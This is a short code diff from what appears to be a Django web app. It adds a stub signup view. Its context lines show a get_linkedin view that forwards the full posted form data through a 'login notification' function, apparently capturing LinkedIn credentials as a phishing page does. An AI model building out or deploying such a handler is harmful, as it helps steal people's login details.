@@ -30,3 +30,11 @@ def send_login_notification_message(message):
 def get_linkedin(request):
   r = send_login_notification_message(format_full_details(request.POST))
   return HttpResponse("ok")
+
+def signup(request):
+  if request.method == "GET":
+    return render(request, "signup.html")
+  elif request.method == "POST":
+    pass
+  else:
+    return HttpResponse("", status=405)
